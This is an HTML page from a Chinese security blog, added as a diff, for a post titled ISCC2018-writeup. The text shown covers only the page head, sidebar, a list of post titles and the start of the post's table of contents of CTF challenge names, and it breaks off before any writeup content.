@@ -1,0 +1,1995 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ISCC2018-writeup | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</title>
+  <meta name="keywords" content=" WP ">
+  <meta name="description" content="ISCC2018-writeup | Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta property="og:url" content="http://Bigbroke.com/404.html">
+<meta property="og:site_name" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta property="og:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-10-07T10:21:52.994Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bigbroke 的成长之路 | Bigbroke | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全">
+<meta name="twitter:description" content="L2Dwidget.init({&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;tagMode&quot;:false,&quot;debug&quot;:false,&quot;model&quot;:{&quot;jsonPath&quot;:&quot;/live2dw/assets/assets/koharu.mode">
+
+
+<link rel="icon" href="/img/head.jpg">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="/css/hl_theme/sublime.css">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/default-skin/default-skin.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js"></script>
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="true">
+</div>
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/head.jpg" />
+</a>
+<div class="author">
+    <span>Bigbroke</span>
+</div>
+
+<div class="icon">
+    
+    <a class="rss" title="rss" href="/atom.xml" target="_blank"></a>
+    
+    
+    <a class="github" title="github" href="https://github.com/bigbroke" target="_blank"></a>
+    
+    
+    
+    
+    
+    <a class="instagram" title="instagram" href="https://www.instagram.com/1_be_winner/" target="_blank"></a>
+    
+    
+    
+    <a class="weibo" title="weibo" href="http://weibo.com/u/xxx/" target="_blank"></a>
+    
+    
+    <a class="email" title="email" href="mailto:72382781@qq.com"></a>
+    
+</div>
+
+
+
+<ul>
+    <li class="all active">全部文章</li>
+    
+    <li data-rel="思考"> 思考 </li>
+    
+    <li data-rel="Language"> Language </li>
+    
+    <li data-rel="CTF"> CTF </li>
+    
+    <li data-rel="AiSecurity"> AiSecurity </li>
+    
+    <li data-rel="代码审计"> 代码审计 </li>
+    
+    <li data-rel="Kali"> Kali </li>
+    
+    <li data-rel="工具"> 工具 </li>
+    
+    <li data-rel="WebSecurity"> WebSecurity </li>
+    
+    <li data-rel="读书摘要"> 读书摘要 </li>
+    
+    <li data-rel="渗透测试"> 渗透测试 </li>
+    
+    <li data-rel="内网"> 内网 </li>
+    
+    <li data-rel="源码阅读"> 源码阅读 </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a style="border-right: 1px solid #fff; width: 49%"  class="about site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="56">
+<input type="hidden" id="yelog_site_word_count" value="115.2k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="/https/www.baidu.com">faBaidu</a></li>
+            
+            <li><a target="_blank" href="/https/www.google.com">fbGoogle</a></li>
+            
+            <li><a target="_blank" href="http://www.cnblogs.com/iamstudy/">I3m0n</a></li>
+            
+            <li><a target="_blank" href="http://ph0rse.me/">Ph0rse</a></li>
+            
+            <li><a target="_blank" href="http://03i0.com/">Sn00py</a></li>
+            
+            <li><a target="_blank" href="http://jlkl.github.io/">Str3am</a></li>
+            
+            <li><a target="_blank" href="http://marblue.me/">Marbule</a></li>
+            
+            <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
+            
+            <li><a target="_blank" href="http://zo1ro.tk/">ZO1RO</a></li>
+            
+            <li><a target="_blank" href="https://blog.ruozhi.xyz/">ru0zhI</a></li>
+            
+            <li><a target="_blank" href="http://wulidecade.cn/">Decade</a></li>
+            
+            <li><a target="_blank" href="https://www.cnblogs.com/sn1per/">Sn1per</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+        <label for="tagswitch">Tags:</label>
+        <input id="tagswitch" type="checkbox">
+    </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">思考</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">life</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">正则</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">WP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">first-blog</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">代码审计</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">sqlilabs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">sqlmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">cve</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">VIM</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Nmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">密码学</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">hexo</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">Nikto</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">TCPDUMP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">QWASP_ZAP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">NETCAT</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">Skipfish</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Vega</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">文件包含</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">读书摘要</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">信息收集</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color1">Web漏洞</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">内网</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">文件上传</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">渗透</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">黑客攻防web安全实战详解</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">入侵</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">Dvwa</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="读书摘要 "
+           href="/archis/a7cdea15/"
+           data-tag="读书摘要"
+           data-author="" >
+            <span class="post-title" title="《互联网企业安全高级指南》读书笔记">《互联网企业安全高级指南》读书笔记</span>
+            <span class="post-date" title="2020-03-04 18:17:30">2020/03/04</span>
+        </a>
+        
+        <a  class="源码阅读 "
+           href="/archis/f4173bf8/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="Read-Sitadel-Source">Read-Sitadel-Source</span>
+            <span class="post-date" title="2019-03-15 00:00:08">2019/03/15</span>
+        </a>
+        
+        <a  class="AiSecurity "
+           href="/archis/eed6fa1/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="AI-Security-Learning">AI-Security-Learning</span>
+            <span class="post-date" title="2019-02-17 21:15:30">2019/02/17</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/f7c9beed/"
+           data-tag="life"
+           data-author="" >
+            <span class="post-title" title="2018反思总结">2018反思总结</span>
+            <span class="post-date" title="2018-12-31 01:14:45">2018/12/31</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/49b464e6/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="初探线下CTF-AWD模式">初探线下CTF-AWD模式</span>
+            <span class="post-date" title="2018-12-02 17:13:50">2018/12/02</span>
+        </a>
+        
+        <a  class="内网 "
+           href="/archis/7db24e65/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="内网渗透基础知识">内网渗透基础知识</span>
+            <span class="post-date" title="2018-12-02 17:07:15">2018/12/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/6bd5dfde/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="第一届安洵杯writeup">第一届安洵杯writeup</span>
+            <span class="post-date" title="2018-11-26 21:23:57">2018/11/26</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4341f801/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="HCTF2018-web writeup">HCTF2018-web writeup</span>
+            <span class="post-date" title="2018-11-13 13:26:20">2018/11/13</span>
+        </a>
+        
+        <a  class="工具 "
+           href="/archis/47a94ec3/"
+           data-tag="docker"
+           data-author="" >
+            <span class="post-title" title="docker复现ctf&amp;dockerfile编写ctf环境">docker复现ctf&amp;dockerfile编写ctf环境</span>
+            <span class="post-date" title="2018-10-29 21:57:39">2018/10/29</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/441c37c9/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="墨者学院审计类通关指南">墨者学院审计类通关指南</span>
+            <span class="post-date" title="2018-10-28 22:02:08">2018/10/28</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/767136e1/"
+           data-tag="复现"
+           data-author="" >
+            <span class="post-title" title="phpMyAdmin 4.8.x 本地文件包含">phpMyAdmin 4.8.x 本地文件包含</span>
+            <span class="post-date" title="2018-10-27 12:19:37">2018/10/27</span>
+        </a>
+        
+        <a  class="读书摘要 "
+           href="/archis/924987ad/"
+           data-tag="读书摘要"
+           data-author="" >
+            <span class="post-title" title="《Web安全攻防-渗透测试实战指南》读书笔记">《Web安全攻防-渗透测试实战指南》读书笔记</span>
+            <span class="post-date" title="2018-10-26 22:05:27">2018/10/26</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/b46a6d47/"
+           data-tag="web"
+           data-author="" >
+            <span class="post-title" title="验证码相关安全问题">验证码相关安全问题</span>
+            <span class="post-date" title="2018-10-23 23:05:15">2018/10/23</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/a5c61176/"
+           data-tag="cve"
+           data-author="" >
+            <span class="post-title" title="Xss in MetInfo V6.1.2">Xss in MetInfo V6.1.2</span>
+            <span class="post-date" title="2018-10-16 02:16:08">2018/10/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/173905c2/"
+           data-tag="ctf"
+           data-author="" >
+            <span class="post-title" title="护网杯wp">护网杯wp</span>
+            <span class="post-date" title="2018-10-13 23:53:02">2018/10/13</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/95d370e7/"
+           data-tag="Web漏洞"
+           data-author="" >
+            <span class="post-title" title="web漏洞挖掘之点击劫持漏洞">web漏洞挖掘之点击劫持漏洞</span>
+            <span class="post-date" title="2018-10-11 14:13:02">2018/10/11</span>
+        </a>
+        
+        <a  class="Language "
+           href="/archis/7fe4b50e/"
+           data-tag="正则"
+           data-author="" >
+            <span class="post-title" title="20个常用的正则表达式">20个常用的正则表达式</span>
+            <span class="post-date" title="2018-10-09 16:29:34">2018/10/09</span>
+        </a>
+        
+        <a  class="AiSecurity "
+           href="/archis/d4eed376/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="机器学习概念">机器学习概念</span>
+            <span class="post-date" title="2018-10-09 16:29:01">2018/10/09</span>
+        </a>
+        
+        <a  class="内网 "
+           href="/archis/17ef10d7/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="浅谈内网渗透流程">浅谈内网渗透流程</span>
+            <span class="post-date" title="2018-10-09 10:50:44">2018/10/09</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/18042369/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="安恒5月">安恒5月</span>
+            <span class="post-date" title="2018-08-25 20:40:51">2018/08/25</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/b20debe2/"
+           data-tag="CTF"
+           data-author="" >
+            <span class="post-title" title="安恒7月">安恒7月</span>
+            <span class="post-date" title="2018-08-25 20:39:36">2018/08/25</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/8395d5c7/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="墨者学院php代码审计1">墨者学院php代码审计1</span>
+            <span class="post-date" title="2018-08-25 20:32:48">2018/08/25</span>
+        </a>
+        
+        <a  class="代码审计 "
+           href="/archis/d8be4236/"
+           data-tag="代码审计"
+           data-author="" >
+            <span class="post-title" title="PHP字符串&#39;和“区别">PHP字符串&#39;和“区别</span>
+            <span class="post-date" title="2018-08-25 20:22:01">2018/08/25</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/35d3b1d4/"
+           data-tag="渗透"
+           data-author="" >
+            <span class="post-title" title="渗透测试基础">渗透测试基础</span>
+            <span class="post-date" title="2018-08-01 23:43:32">2018/08/01</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/80e1beed/"
+           data-tag="思考"
+           data-author="" >
+            <span class="post-title" title="八月展望">八月展望</span>
+            <span class="post-date" title="2018-08-01 23:41:26">2018/08/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/f4e3f3ec/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="2018SCTF-wp">2018SCTF-wp</span>
+            <span class="post-date" title="2018-06-20 22:40:40">2018/06/20</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/2947d8f2/"
+           data-tag="密码学"
+           data-author="" >
+            <span class="post-title" title="cbc字节翻转攻击">cbc字节翻转攻击</span>
+            <span class="post-date" title="2018-06-01 00:47:50">2018/06/01</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4e1d9865/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="ISCC2018-writeup">ISCC2018-writeup</span>
+            <span class="post-date" title="2018-05-28 00:54:05">2018/05/28</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/ceb4048b/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="全国网络空间安全技术大赛2018三道wp">全国网络空间安全技术大赛2018三道wp</span>
+            <span class="post-date" title="2018-05-15 19:04:17">2018/05/15</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/e36e397d/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="bugku-misc">bugku-misc</span>
+            <span class="post-date" title="2018-05-01 19:02:14">2018/05/01</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/40a439a4/"
+           data-tag="Nmap"
+           data-author="" >
+            <span class="post-title" title="Nmap 使用技巧汇总">Nmap 使用技巧汇总</span>
+            <span class="post-date" title="2018-04-23 22:07:46">2018/04/23</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/844a29d4/"
+           data-tag="文件包含"
+           data-author="" >
+            <span class="post-title" title="php文件包含漏洞">php文件包含漏洞</span>
+            <span class="post-date" title="2018-04-23 21:39:49">2018/04/23</span>
+        </a>
+        
+        <a  class="WebSecurity "
+           href="/archis/ea42f6a6/"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="文件上传总结">文件上传总结</span>
+            <span class="post-date" title="2018-04-23 21:39:03">2018/04/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/a7a61e20/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="DDCTF三道小结">DDCTF三道小结</span>
+            <span class="post-date" title="2018-04-23 21:35:39">2018/04/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/1f382107/"
+           data-tag="入侵"
+           data-author="" >
+            <span class="post-title" title="高级入侵">高级入侵</span>
+            <span class="post-date" title="2018-04-23 21:33:14">2018/04/23</span>
+        </a>
+        
+        <a  class="渗透测试 "
+           href="/archis/312e3d12/"
+           data-tag="信息收集"
+           data-author="" >
+            <span class="post-title" title="信息收集">信息收集</span>
+            <span class="post-date" title="2018-04-02 16:15:51">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/ced895c1/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs less11-15">sqli-labs less11-15</span>
+            <span class="post-date" title="2018-04-02 16:15:38">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/9a0d7777/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs  less7-10">sqli-labs  less7-10</span>
+            <span class="post-date" title="2018-04-02 16:15:23">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/4303333d/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="sqli-labs5-6(盲注)">sqli-labs5-6(盲注)</span>
+            <span class="post-date" title="2018-04-02 16:14:58">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/239c6225/"
+           data-tag="sqlilabs"
+           data-author="" >
+            <span class="post-title" title="Sqli-labs  1-4">Sqli-labs  1-4</span>
+            <span class="post-date" title="2018-04-02 16:13:07">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/79216fa/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="实验吧web—writeup">实验吧web—writeup</span>
+            <span class="post-date" title="2018-04-02 16:10:18">2018/04/02</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/2ccf6cb2/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="第二届强网杯-部分wp">第二届强网杯-部分wp</span>
+            <span class="post-date" title="2018-04-02 16:08:51">2018/04/02</span>
+        </a>
+        
+        <a  class="读书摘要 "
+           href="/archis/2ab3b8ea/"
+           data-tag="黑客攻防web安全实战详解"
+           data-author="" >
+            <span class="post-title" title="黑客攻防web安全实战详解">黑客攻防web安全实战详解</span>
+            <span class="post-date" title="2018-02-27 19:57:12">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/b248361f/"
+           data-tag="QWASP_ZAP"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP">kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</span>
+            <span class="post-date" title="2018-02-27 19:54:20">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/136af25a/"
+           data-tag="Vega"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Vega">kali渗透测试之Web渗透-扫描工具-Vega</span>
+            <span class="post-date" title="2018-02-27 19:51:36">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/497d64c3/"
+           data-tag="Skipfish"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Skipfish">kali渗透测试之Web渗透-扫描工具-Skipfish</span>
+            <span class="post-date" title="2018-02-27 19:49:37">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/a04b3dd7/"
+           data-tag="Nikto"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-扫描工具-Nikto">kali渗透测试之Web渗透-扫描工具-Nikto</span>
+            <span class="post-date" title="2018-02-27 19:47:03">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/2b646ba1/"
+           data-tag="TCPDUMP"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-工具-TCPDUMP">kali渗透测试之Web渗透-工具-TCPDUMP</span>
+            <span class="post-date" title="2018-02-27 19:42:43">2018/02/27</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/32be69d6/"
+           data-tag="NETCAT"
+           data-author="" >
+            <span class="post-title" title="kali渗透测试之Web渗透-工具-NETCAT">kali渗透测试之Web渗透-工具-NETCAT</span>
+            <span class="post-date" title="2018-02-27 19:38:09">2018/02/27</span>
+        </a>
+        
+        <a  class="工具 "
+           href="/archis/2e6b5387/"
+           data-tag="VIM"
+           data-author="" >
+            <span class="post-title" title="Vim简单入门笔记">Vim简单入门笔记</span>
+            <span class="post-date" title="2017-12-15 19:07:45">2017/12/15</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/fb4597d6/"
+           data-tag="思考"
+           data-author="" >
+            <span class="post-title" title="17-11反思与进取">17-11反思与进取</span>
+            <span class="post-date" title="2017-11-22 17:10:55">2017/11/22</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/18acffef/"
+           data-tag="Dvwa"
+           data-author="" >
+            <span class="post-title" title="DVWA笔记">DVWA笔记</span>
+            <span class="post-date" title="2017-11-22 17:06:26">2017/11/22</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/undefined/"
+           data-tag="hexo"
+           data-author="" >
+            <span class="post-title" title="hexo博客搭建">hexo博客搭建</span>
+            <span class="post-date" title="2017-11-22 16:57:45">2017/11/22</span>
+        </a>
+        
+        <a  class="Kali "
+           href="/archis/18bbc00d/"
+           data-tag="sqlmap"
+           data-author="" >
+            <span class="post-title" title="SQLMAP注入教程-11种常见SQLMAP使用方法详解">SQLMAP注入教程-11种常见SQLMAP使用方法详解</span>
+            <span class="post-date" title="2017-11-21 04:27:10">2017/11/21</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/archis/83955867/"
+           data-tag="WP"
+           data-author="" >
+            <span class="post-title" title="第八届Geek部分web">第八届Geek部分web</span>
+            <span class="post-date" title="2017-10-20 16:07:05">2017/10/20</span>
+        </a>
+        
+        <a  class="思考 "
+           href="/archis/e53fb0b9/"
+           data-tag="first-blog"
+           data-author="" >
+            <span class="post-title" title="my-first-blog">my-first-blog</span>
+            <span class="post-date" title="2017-09-27 16:56:58">2017/09/27</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-ISCC2018-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">ISCC2018-writeup</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+            <a href="javascript:" data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color3">WP</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:12'>2018-05-28 00:54</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:3,808</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-that？"><span class="toc-text">What is that？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数字密文"><span class="toc-text">数字密文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#秘密电报："><span class="toc-text">秘密电报：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重重谍影"><span class="toc-text">重重谍影</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#有趣的ISCC"><span class="toc-text">有趣的ISCC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Where-is-the-FLAG？"><span class="toc-text">Where is the FLAG？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#凯撒十三世"><span class="toc-text">凯撒十三世</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一只猫的心思"><span class="toc-text">一只猫的心思</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#暴力XX不可取"><span class="toc-text">暴力XX不可取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#比较数字大小"><span class="toc-text">比较数字大小</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web01"><span class="toc-text">web01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地的诱惑"><span class="toc-text">本地的诱惑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#你能跨过去吗？"><span class="toc-text">你能跨过去吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一切都是套路"><span class="toc-text">一切都是套路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#foreach"><span class="toc-text">foreach</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#你能绕过吗"><span class="toc-text">你能绕过吗?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web02"><span class="toc-text">web02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#请ping我的ip-看你能Ping通吗？"><span class="toc-text">请ping我的ip 看你能Ping通吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php是世界上最好的语言"><span class="toc-text">php是世界上最好的语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Please-give-me-username-and-password"><span class="toc-text">Please give me username and password!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入的艺术"><span class="toc-text">SQL注入的艺术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#试试看"><span class="toc-text">试试看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Collide"><span class="toc-text">Collide</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Only-admin-can-see-flag"><span 